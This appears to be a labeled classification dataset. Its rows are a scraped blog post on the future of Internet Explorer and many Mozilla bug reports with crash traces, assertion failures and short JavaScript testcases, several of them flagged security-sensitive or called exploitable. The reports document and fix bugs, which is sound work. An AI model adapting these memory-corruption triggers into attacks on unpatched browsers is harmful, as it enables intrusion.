class bloghed ul li a href is ie8 the end of the line for internet explorer a li li a href app-v 4.6 too little too late a li li a href windows 7 the compatibility blame game a li li a href windows 7 cutting corners in the rush to market a li li a href would vdi please just go away a li li a href windows 7 is it so hard to say we re sorry a li li a href windows 7 poking holes in vista s uac umbrella a li li a href app-v med-v and missed opportunities a li li a href whither windows vista a li li a href windows 7 beta unresolved problems a li ul div div class ad align center begin ad tag script language javascript adcall 160 600 skyscraper script noscript a href target blank img src width 160 height 600 border 0 alt a noscript end ad tag div div end div left-box f-left div class right f-right middle column div class sub-left f-left search referral box div id oneclicktop div header top tool kits div a href img src enterprisedesktop/header.jpg a div div class blogoptions ul li a href img src border 0 alt rss subscription align absmiddle a li li a href subscribe a li li nbsp nbsp li li a href img src alt e-mail border 0 align absmiddle hspace 3 a li li a href email a li li nbsp nbsp li li a href img src alt print this border 0 align absmiddle hspace 3 a li li a href print a li li nbsp nbsp li li a href enterprisedesktop/about.html read randall s bio a li li nbsp nbsp li li a href mailto randall_kennedy 64 infoworld 46 com class realsmall contact randall kennedy a li ul div end div blogoptions div class yellow bc player breadcrumbs a href class breadcrumb enterprise desktop randall c kennedy nbsp raquo a is ie8 the end of the line for internet explorer js kit p march 10 2009 nbsp nbsp a href postacomment comments nbsp span class js-kit-comments-count path enterprisedesktop/21160 0 span a div class js-kit-rating view combo permalink freeze yes style width 110px float right margin-top 10px padding 30px 0px 20px 20px background-image url div blog headline h1 class dek is ie8 the end of the line for internet explorer h1 dek h2 class dek2 dropping ie in favor of a newer rendering engine may be not be as easy as it seems h2 tags related contents p class breadcrumb tags a href computing cloud computing a a href microsoft a a href productivity a a href 7 windows 7 a a href vista windows vista a a href xp windows xp a br p blog body div class post p ie8 is the last version of the internet explorer web browser at least that s what i m hearing through the grapevine it seems that microsoft is preparing to throw in the towel on its internet explorer engine once and for all p p and just what will be its replacement i ’ m getting conflicting stories on that one some are still claiming that a href target blank microsoft will go with webkit a which thanks to the popularity of apple s safari browser and also google s chrome is rapidly becoming a de facto standard for all non-ie and non-firefox implementations p p others insist that that the whole webkit story is merely a feint and that microsoft will in fact be adopting a a href target blank brand-new engine a coming out of its microsoft research division dubbed a href gazelle a this new engine will supposedly be more secure than firefox or even chrome making copious use of sandboxing to keep its myriad plug-ins isolated and the overall browser process model protected p p b get the a href full scoop on the gazelle browser technology a that may replace internet explorer b p p but regardless of which direction microsoft takes webkit or gazelle it will still have to navigate the treacherous waters of legacy activex support and as someone who has spent some not-so-quality time developing activex controls in the past the need to maintain some sort of compatibility layer within any proposed ie replacement is a critical consideration p p for most casual users i.e grandma in her den surfing ebay activex was and is just another annoying a href ria rich internet application mechanism a one that has increasingly been supplanted by adobe flash or various ajax-based mechanisms however for enterprise it shops with a heavy microsoft investment activex has long been an integral part of many in-house applications p p if microsoft intends to pull the plug on ie after version 8 it will need to articulate a clear legacy migration strategy that allows these shops to preserve their investments in activex controls and resources p p then there ’ s the issue of legacy html/css support so much of the web has been tweaked for ie 6.x compatibility that even microsoft s own attempts to implement a more standards-compliant browser engine in ie8 have met with disastrous results for me the situation so bad that when i do find myself using ie 8 typically to view a site that causes my copy of the chrome 2.x beta release to blow up i end up configuring ie 8 s compatibility mode as the default viewing option since the browser s native rendering mode breaks practically every site i visit p p finally there s the matter of third-party developers using ie s rendering engine with their own applications a good example would be a program that includes a help file in html format and then uses a custom form to display an embedded web browser object to host the file this embedded object is invariably an activex container for the ie engine that s installed with windows so any attempt to remove ie from the os or to radically change its core underpinnings will need to account for applications that rely on the existence of an accessible programmable ie object model p p of course all of the above is old hat for microsoft a company whose status as global software leader too often makes it a victim of its own success i for one look forward to the possibility of a clean break with ie s creaky old rendering engine but i hope the company pays more care and attention to preserving legacy compatibility than it did with some of its more recent os efforts p a name more a p posted by randall c kennedy on march 10 2009 03:00 am p br div end blog body rating widget strong style float left rate this article strong br br div class js-kit-rating view split style float left margin-top 15px padding-left 130px permalink div script src script br br begin digg it widget span class f-right style margin-top 65px script type text/javascript digg_url digg_title is ie8 the end of the line for internet explorer digg_bodytext dropping ie in favor of a newer rendering engine may be not be as easy as it seems digg_topic tech_news digg_media news digg_window new script script src type text/javascript script span end digg it widget br br bot tool kits div class lowerblogoptions ul li a href img src border 0 alt rss subscription align absmiddle a li li a href subscribe a li li nbsp nbsp li li a href img src alt e-mail border 0 align absmiddle hspace 3 a li li a href email a li li nbsp nbsp li li a href img src alt print this border 0 align absmiddle hspace 3 a li li a href print a li li nbsp nbsp li li a href img src align absmiddle a li li a href slashdot a li ul ul li a href img src align absmiddle a li li a href reddit a li li nbsp nbsp li li a href img src align absmiddle hspace 3 a li li a href digg a li li nbsp nbsp li li a href img src align absmiddle hspace 3 a li li a href de.li.cio.us a li li nbsp nbsp li li a href img border=0 src alt stumbleupon toolbar a li li a href stumble it a li li nbsp nbsp li li a href img src align absmiddle hspace 3 a li li a href newsvine a li ul div end div lowerblogoptions div p nbsp p div comments section a name postacomment a div class commented center ul style text-align left li nbsp img src align absmiddle li li comments li ul center div end div commented div style border 1px solid cccccc border-top none padding 0px 10px 10px 10px width 415px background f8f8f8 br js kit comments widget div class js-kit-comments backwards yes path enterprisedesktop/21160 permalink standalone yes label img src border 0 style display none template for a single comment entry this template is optional div class js-singlecomment style padding 5px 10px 10px 5px margin-top 10px background ffffff br add avatar div class js-singlecommentavatar style margin-top 10px width 50px height 50px div ul class js-singlecommentinfo style float left margin 0px padding 0px list-style-type none list-style-image none background ffffff font-family helvetica arial times new roman font-size 12px color 000000 li class js-singlecommentname style display inline padding-left 10px padding-bottom 10px font-weight bold name li li class js-singlecommentdate style display inline padding-left 10px padding-bottom 10px font-family helvetica arial times new roman font-size 12px color 000000 date li li class js-singlecommentdate style display inline padding-left 10	11
fix strange rendering bug when javascript is executed everything is rendered twice user-agent mozilla/5.0 windows u windows nt 6.0 en-us rv:1.9.0.8 gecko/2009032609 firefox/3.0.8 net clr 3.5.30729 build identifier mozilla/5.0 windows u windows nt 6.0 en-us rv:1.9.0.8 gecko/2009032609 firefox/3.0.8 net clr 3.5.30729 i am developing an extension which uses the jquery library the reverent aspect of the functionality can be thought of as being a simpler version of greasemonkey when a page loads i execute jquery in the context of the page and then execute a few other scripts that uses jquery to modify the page dom to provide the user with a few convenient features there is a bug however with firefox such that executing jquery causes certain pages to render twice as if the entire page has been copy and pasted i have provided a stripped down version of my extension which demonstrates this effect in this version jquery is injected into the page in the form of a script tag but it also occurs if jquery is executed by evalinsandbox i do not believe this is a jquery bug since it works fine when i include it in the html file it only triggers the bug when injected or eval'ed in evalinsandbox reproducible always steps to reproduce 1 install the provided xpi 2 open up the included html or go to 3 you may need to refresh the page 4 everything is rendered twice actual results everything is rendered twice expected results everything is rendered only once	11
crash js_hashtablerawlookup with xpcsafejsobjectwrapper getter tosource thread 0 crashed 0 js_hashtablerawlookup 10 jshash.cpp:177 1 marksharpobjects jscontext jsobject jsidarray 120 jsobj.cpp:360 2 marksharpobjects jscontext jsobject jsidarray 750 jsobj.cpp:418 3 marksharpobjects jscontext jsobject jsidarray 750 jsobj.cpp:418 4 js_entersharpobject 277 jsobj.cpp:475 5 js_array_join_sub 141 jsarray.cpp:1214 6 array_tostring jscontext unsigned int long 165 jsarray.cpp:1429 7 js_invoke 1313 jsinterp.cpp:1189	11
crash in array push exceeding length limit initarrayelements a new array 4294967294 a.push foo bar	11
possible stack corruption starting at unknown symbol steps to reproduce load crashs 1.9.1 opt/debug builds mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.1b5pre gecko/20090515 shiretoko/3.5b5pre and trunk mozilla/5.0 windows u windows nt 5.1 en-us rv:1.9.2a1pre gecko/20090515 minefield/3.6a1pre fa8.18c access violation code c0000005 second chance eax=3ecb3f57 ebx=7ffdf000 ecx=0012ea4c edx=06389f15 esi=00d0b4e8 edi=00150000 eip=06389f39 esp=0012d934 ebp=0012d950 iopl=0 nv up ei pl nz na po nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202 06389f39 3b00 cmp eax dword ptr eax ds:0023:3ecb3f57 the stack trace contains one or more locations for which no symbol or module could be found this may be a sign of stack corruption childebp retaddr warning frame ip not in any known module following frames may be wrong 0012d930 0028b31d 0012d950 02c6dc49 xpcom_core nsqueryinterface operator 0284f81c 6c6c697a gklayout nscomptr nsidomhtmldocument assign_from_qi 0284f81c 00000000 quit	11
mirrorwrappednativeparent result sometimes uninitialized js_lockgcthingrt i was looking at crash reports there s a number of crashes in js_lockgcthingrt being called from xpcnativewrapper getneworused we call js_lockgcthingrt on the result of a call to mirrorwrappednativeparent turns out that mirrorwrappednativeparent sometimes returns pr_true without initializing the result out pointer i think setting it to null would be the right thing to do i think that this probably shows up under a number of different crash signatures because xpcnativewrapperctor also calls mirrorwrappednativeparent and it uses the uninitialized pointer to set it as a parent by calling js_setparent nominating for blocking and marking security sensitive	11
firefox crash nswindow getparentwindow int nsbasewidget destroy currently the 4 top crash in firefox 3.1b2 0 xul.dll nswindow getparentwindow widget/src/windows/nswindow.cpp:1544 1 xul.dll nswindow getparent widget/src/windows/nswindow.cpp:1518 2 xul.dll nsbasewidget destroy widget/src/xpwidgets/nsbasewidget.cpp:260 3 xul.dll nswindow destroy widget/src/windows/nswindow.cpp:1416 4 xul.dll nsplugininstanceowner destroy layout/generic/nsobjectframe.cpp:4030 5 xul.dll dostopplugin layout/generic/nsobjectframe.cpp:1987 6 xul.dll nsstoppluginrunnable run layout/generic/nsobjectframe.cpp:2024 7 xul.dll nsthread processnextevent xpcom/threads/nsthread.cpp:510 8 xul.dll nsbaseappshell run widget/src/xpwidgets/nsbaseappshell.cpp:170 9 nspr4.dll pr_getenv 10 firefox.exe wmain toolkit/xre/nswindowswmain.cpp:87 11 firefox.exe firefox.exe 12 kernel32.dll kernel32.dll not many comments to go on replying to message in yahoo mail at the time it crashed had just hit reply	11
crash buildtextrunsscanner breaksink setbreaks with moz-column pre-wrap font-size-adjust multiple text runs assertion flag set that should never be set memory safety error mtextrun getflags gfxtextrunwordcache text_unused_flags nstextframeutils text_unused_flag file users/jruderman/central/layout/generic/nstextframethebes.cpp line 766 or crash buildtextrunsscanner breaksink setbreaks touching random a memory location	11
assertion failure isint32 p at jstracer.cpp:2587 with nested trees var arr 0 0 0 0 0 inner tree compiles first path 0 0 0 0 0 0 0 0 0 0 outer tree compiles 0 0 0 0 0 0 0 0 0 0 1 0 0 0 0 inner tree compiles different path assinging x outer tree extends different inner tree exit 1 0 0 0 0 1 0 0 0 0 1 0 0 0 0 assertion failure isint32 p at jstracer.cpp:2587 1 0 0 0 0 var x 0 for var i 0 i 10 i var b arr i for var j 0 j 5 j if b 0 x x 0	11
tm possible gc rooting bug with google docs this is a secondary bug from bug 504797 to reproduce use this rev with a debug build changeset 32107 e8a55ae8fb98 tag qparent user andreas gal gal mozilla.com date mon aug 31 17:02:16 2009 0700 summary compilation fix for bug 513787 and create a new document in google docs you may get a slow script dialog but if you continue it will crash eventually inside array_slice called from trace the problem is that the array created by js_newarrayobject at the end of array_slice the non-dense case gets gc d and its fields overwritten while it is being populated in the loop i showed that by printing field values immediately after allocation and then inside setarrayelement i also tried adding a new jsautotempvaluerooter right after the call to js_newarrayobject and that stopped the problem	11
tm assertion failure thing at jsgc.cpp function eval function for var y 0 y 16 y if y 3 2 gczeal 1 else print 0 0 asserts js debug shell with j at assertion failure thing at jsgc.cpp:2610 brendan says and i confirmed that this is most probably related to bug 513981 security-sensitive since bug 513981 is locked too	11
date.settime sets slots without checking for date class my changes for bug 412296 removed the check for date class in the implementation of date.prototype.settime method this allows to overwrite slots with jsnan value in arbitrary object the following test case demonstrates the problem m/tm/js/src cat s/x.js var x new function return 10 date.prototype.settime.call x print x m/tm/js/src build/js32.tm.dbg/js s/x.js assertion failure stobj_get_class obj js_dateclass at home/igor/m/tm/js/src/jsdate.cpp:1227 trace/breakpoint trap	11
add dns pre-fetching to necko and firefox not sure what it actually does but google s chrome beta has a enable dns pre-fetching preferences and if it s what i think it is we should do something like that i figure we could either pre-fetch dns for all links visible links in the viewport or links that get a mouse hover for some millisecond count	6
make dns-prefetching subject to user-defined policies bug 453403 implemented dns prefetching in necko which has severe security implications local html pages will generate dns queries even if other remote content is disabled e.g for mere a href this gets even more creepy if we take into account that seamonkey and thunderbird render all messages even plaintext ones as html documents in a browser element thus reading a plaintext message will already make you acknowledge the existence of this account e.g by using one-time subdomain entries because even in plaintext mode links are rendered as clickable items until now there was a commonly agreed assumption that reading local html without remote content will keep your privacy intact this promise is broken now while you can turn off the prefetching entirely by using network.dns.disableprefetch this is no real option for seamonkey although maybe for tb because you ca n't seriously apply one single setting to public websurfing viewing local html documents in the browser and reading mail all alike without affecting user experience we could even work around the mail case by trying to produce certain markup but that is rather band-aiding than fixing the real issue and of course this will not help a bit when viewing local html documents in the browser	6
double items in layout when alert called from mutation event handler build id mozilla/5.0 macintosh u intel mac os x 10.5 en-us rv:1.9.1b3pre gecko/20081127 minefield/3.1b3pre steps to reproduce load the attachment actual results content that is inserted once to the dom shows up twice in layout ca n't be selected does n't show up it firebug inspector expected expected things to show up in layout once	11
crash nsxblbinding generateanonymouscontent with domattrmodified and oncommand removing element and xbl inherits xbl text see testcase which crashes current trunk build and firefox 3 after 100ms 0 xul.dll xul.dll 1 xul.dll nsbasehashtable nsisupportshashkey nscssframeconstructor restyledata nscssframeconstructor restyledata s_enumstub obj-firefox/dist/include/nsbasehashtable.h:346 2 xul.dll pl_dhashtableenumerate obj-firefox/xpcom/build/pldhash.c:754 3 xul.dll nsxblbinding generateanonymouscontent content/xbl/src/nsxblbinding.cpp:794 4 xul.dll nsxblservice loadbindings content/xbl/src/nsxblservice.cpp:664 5 xul.dll nselementsh postcreate dom/base/nsdomclassinfo.cpp:7620 6 xul.dll xpcwrappednative getneworused js/src/xpconnect/src/xpcwrappednative.cpp:599 firefox 3 crash report 0 xul.dll nscomptr nsirdfnode operator nscomptr.h:713 1 xul.dll realizedefaultcontent mozilla/content/xbl/src/nsxblbinding.cpp:548 2 xul.dll nsbasehashtable nsurihashkey cachescriptentry cachescriptentry s_enumstub nsbasehashtable.h:346 3 xul.dll pl_dhashtableenumerate pldhash.c:724 4 xul.dll nsxblbinding generateanonymouscontent mozilla/content/xbl/src/nsxblbinding.cpp:775 5 xul.dll nsxblservice loadbindings mozilla/content/xbl/src/nsxblservice.cpp:635 6 xul.dll nselementsh postcreate mozilla/dom/src/base/nsdomclassinfo.cpp:7236 7 xul.dll xpcwrappednative getneworused mozilla/js/src/xpconnect/src/xpcwrappednative.cpp:546 8 xul.dll xpcconvert nativeinterface2jsobject mozilla/js/src/xpconnect/src/xpcconvert.cpp:1107 9 xul.dll xpcconvert nativedata2js mozilla/js/src/xpconnect/src/xpcconvert.cpp:482 10 xul.dll xpcwrappednative callmethod mozilla/js/src/xpconnect/src/xpcwrappednative.cpp:2481 11 xul.dll xpc_wn_callmethod mozilla/js/src/xpconnect/src/xpcwrappednativejsops.cpp:1473 12 js3250.dll js_invoke mozilla/js/src/jsinterp.c:1310 13 js3250.dll js_interpret mozilla/js/src/jsinterp.c:4883 14 js3250.dll js_invoke mozilla/js/src/jsinterp.c:1326 15 js3250.dll js_callfunctionvalue mozilla/js/src/jsapi.c:5058 16 xul.dll nsjscontext calleventhandler mozilla/dom/src/base/nsjsenvironment.cpp:1962 17 xul.dll nsglobalwindow runtimeout mozilla/dom/src/base/nsglobalwindow.cpp:7900 18 xul.dll nsglobalwindow timercallback mozilla/dom/src/base/nsglobalwindow.cpp:8231 19 xul.dll nstimerimpl fire mozilla/xpcom/threads/nstimerimpl.cpp:400 20 xul.dll nstimerevent run mozilla/xpcom/threads/nstimerimpl.cpp:490 21 xul.dll nsthread processnextevent mozilla/xpcom/threads/nsthread.cpp:510 22 xul.dll nsbaseappshell run mozilla/widget/src/xpwidgets/nsbaseappshell.cpp:170 23 nspr4.dll pr_getenv 24 firefox.exe wmain mozilla/toolkit/xre/nswindowswmain.cpp:87 25 firefox.exe firefox.exe 26 kernel32.dll kernel32.dll	11
crash nscomptr_base assign_from_qi nsqueryinterface nsid const currently 40 of the topcrash stats other then google pagespeed plugin crashed when analysing a page no other steps to reproduce mentioned investigating	11
indomutils getrulenodeforcontent can hand back a dead rulenode see bug 527567 comment 5	11
crash txexecutionstate txexecutionstate load the testcase and refresh if it does n't crash right away eip is sometimes different especially when extra fluff is added to the transform and to the original document so imo this is exploitable	11
crashes nsiframe getstyledisplay new crash on trunk and firefox 3.6 due to frame poisoning spin off from bug 526587 12 rank in report from 2009 11 22 12 92 windows nt nsiframe getstyledisplay reports at rame module signature expand source 0 xul.dll nsiframe getstyledisplay layout/style/nsstylestructlist.h:95 1 xul.dll xul.dll 2 xul.dll presshell handleeventinternal layout/base/nspresshell.cpp:6471 3 xul.dll presshell handlepositionedevent layout/base/nspresshell.cpp:6296 4 xul.dll presshell handleevent layout/base/nspresshell.cpp:6160 5 xul.dll nsviewmanager handleevent view/src/nsviewmanager.cpp:1222 6 xul.dll nsviewmanager dispatchevent view/src/nsviewmanager.cpp:1201 7 xul.dll handleevent view/src/nsview.cpp:167 8 xul.dll nswindow dispatchevent widget/src/windows/nswindow.cpp:2885 9 xul.dll nswindow dispatchwindowevent widget/src/windows/nswindow.cpp:2913 10 xul.dll nswindow dispatchmouseevent widget/src/windows/nswindow.cpp:3288 11 xul.dll childwindow dispatchmouseevent widget/src/windows/nswindow.cpp:6959 sort on address for more reports	11
crash at wikipedia with moz-column and list-item nslinebox markdirty nsblockframe doremoveframe nsiframe unsigned int 1 2 crash 1.9.3 but not 1.9.2 this mfirstchild mbounds mascent nslinebox const gklayout.dll nslinebox markdirty line 252 bytes c gklayout.dll nsblockframe doremoveframe nsiframe adeletedframe unsigned int aflags=0 line 5406 c gklayout.dll removeblockchild nsiframe aframe int aremoveonlyfluidcontinuations=1 line 5183 c gklayout.dll nsblockframe doremoveframe nsiframe adeletedframe unsigned int aflags=0 line 5414 bytes c gklayout.dll nsblockframe deletenextinflowchild nsprescontext aprescontext nsiframe anextinflow int adeletingemptyframes=1 line 5532 c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=0 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 359 c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=3 line 993 bytes c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=9242 int ay=0 unsigned int aflags=0 unsigned int astatus=3 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll nscolumnsetframe reflowchildren nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=3 const nscolumnsetframe reflowconfig aconfig int aunboundedlastcolumn=0 nscollapsingmargin abottommargincarriedout nscolumnsetframe columnbalancedata acoldata line 675 c gklayout.dll nscolumnsetframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=3 line 1035 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=0 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=3 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=0 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowfloat nsblockreflowstate astate const nsrect afloatavailablespace nsiframe afloat nsmargin afloatmargin unsigned int areflowstatus=0 line 5657 bytes c gklayout.dll nsblockreflowstate flowandplacefloat nsiframe afloat unsigned int areflowstatus=0 int aforcefit=1 line 768 c gklayout.dll nsblockreflowstate addfloat nslinelayout alinelayout nsiframe afloat int aavailablewidth=58428 unsigned int areflowstatus=0 line 580 bytes c gklayout.dll nslinelayout addfloat nsiframe afloat int aavailablewidth=58428 unsigned int areflowstatus=0 line 218 c gklayout.dll nslinelayout reflowframe nsiframe aframe unsigned int areflowstatus=0 nshtmlreflowmetrics ametrics int apushedframe=0 line 892 bytes c gklayout.dll nsblockframe reflowinlineframe nsblockreflowstate astate nslinelayout alinelayout nslinelist_iterator aline nsiframe aframe linereflowstatus alinereflowstatus line 3745 bytes c gklayout.dll nsblockframe doreflowinlineframes nsblockreflowstate astate nslinelayout alinelayout nslinelist_iterator aline nsflowarearect afloatavailablespace int aavailablespaceheight=0 nsfloatmanager savedstate afloatstatebeforeline int akeepreflowgoing linereflowstatus alinereflowstatus int aallowpullup=1 line 3539 bytes c gklayout.dll nsblockframe reflowinlineframes nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3396 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2439 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=0 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=1 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 310 bytes c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=0 line 993 bytes c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=0 int ay=0 unsigned int aflags=0 unsigned int astatus=0 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll nscanvasframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=0 line 554 c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=0 int ay=0 unsigned int aflags=3 unsigned int astatus=0 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll nshtmlscrollframe reflowscrolledframe scrollreflowstate astate int aassumehscroll=0 int aassumevscroll=1 nshtmlreflowmetrics ametrics int afirstpass=1 line 545 bytes c gklayout.dll nshtmlscrollframe reflowcontents scrollreflowstate astate const nshtmlreflowmetrics adesiredsize line 639 bytes c gklayout.dll nshtmlscrollframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=0 line 840 bytes c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=0 int ay=0 unsigned int aflags=0 unsigned int astatus=0 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll viewportframe reflow nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=0 line 285 bytes c gklayout.dll presshell doreflow nsiframe target int ainterruptible=1 line 7373 c gklayout.dll presshell processreflowcommands int ainterruptible=1 line 7493 bytes c gklayout.dll presshell flushpendingnotifications mozflushtype atype=flush_interruptiblelayout line 4930 bytes c gklayout.dll presshell reflowevent run line 7180 c xpcom_core.dll nsthread processnextevent int maywait=1 int result line 527 bytes c xpcom_core.dll ns_processnextevent_p nsithread thread int maywait=1 line 250 bytes c gkwidget.dll nsbaseappshell run line 170 bytes c toolkitcomps.dll nsappstartup run line 182 bytes c xul.dll xre_main int argc=4 char argv const nsxreappdata aappdata line 3499 bytes c firefox.exe ns_internal_main int argc=4 char argv line 158 bytes c firefox.exe wmain int argc=4 wchar_t argv line 120 bytes c firefox.exe tmaincrtstartup line 594 bytes c firefox.exe wmaincrtstartup line 414 c kernel32.dll 7c817077 frames below may be incorrect and/or missing no symbols loaded for kernel32.dll mozjs.dll nanojit assembler resourceconsistencycheck line 256 bytes c uconv.dll nsshiftjistounicodeconstructor nsisupports aouter const nsid aiid void aresult line 436 bytes c xpcom_core.dll nssupportscharimpl addref line 449 bytes c	11
crash at wikipedia with moz-column and list-item nslinebox markdirty nsblockframe doremoveframe nsiframe unsigned int 1 2 crash 1.9.3 but not 1.9.2 this mfirstchild mbounds mascent nslinebox const gklayout.dll nslinebox markdirty line 252 bytes c gklayout.dll nsblockframe doremoveframe nsiframe adeletedframe unsigned int aflags=0 line 5406 c gklayout.dll removeblockchild nsiframe aframe int aremoveonlyfluidcontinuations=1 line 5183 c gklayout.dll nsblockframe doremoveframe nsiframe adeletedframe unsigned int aflags=0 line 5414 bytes c gklayout.dll nsblockframe deletenextinflowchild nsprescontext aprescontext nsiframe anextinflow int adeletingemptyframes=1 line 5532 c gklayout.dll nsblockreflowcontext reflowblock const nsrect aspace int aapplytopmargin=0 nscollapsingmargin aprevmargin int aclearance=0 int aisadjacentwithtop=1 nslinebox aline nshtmlreflowstate aframers unsigned int aframereflowstatus=0 nsblockreflowstate astate line 359 c gklayout.dll nsblockframe reflowblockframe nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 3115 bytes c gklayout.dll nsblockframe reflowline nsblockreflowstate astate nslinelist_iterator aline int akeepreflowgoing line 2384 bytes c gklayout.dll nsblockframe reflowdirtylines nsblockreflowstate astate line 1885 bytes c gklayout.dll nsblockframe reflow nsprescontext aprescontext nshtmlreflowmetrics ametrics const nshtmlreflowstate areflowstate unsigned int astatus=3 line 993 bytes c gklayout.dll nscontainerframe reflowchild nsiframe akidframe nsprescontext aprescontext nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate int ax=9242 int ay=0 unsigned int aflags=0 unsigned int astatus=3 nsoverflowcontinuationtracker atracker line 774 bytes c gklayout.dll nscolumnsetframe reflowchildren nshtmlreflowmetrics adesiredsize const nshtmlreflowstate areflowstate unsigned int astatus=3 const nscolumnsetframe reflowconfig aconfig int aunboundedlastcolumn=0 nscollapsingmargin abottommargincarriedout nscolumnsetframe columnbalancedata acoldata line 675 c gklayout.dll 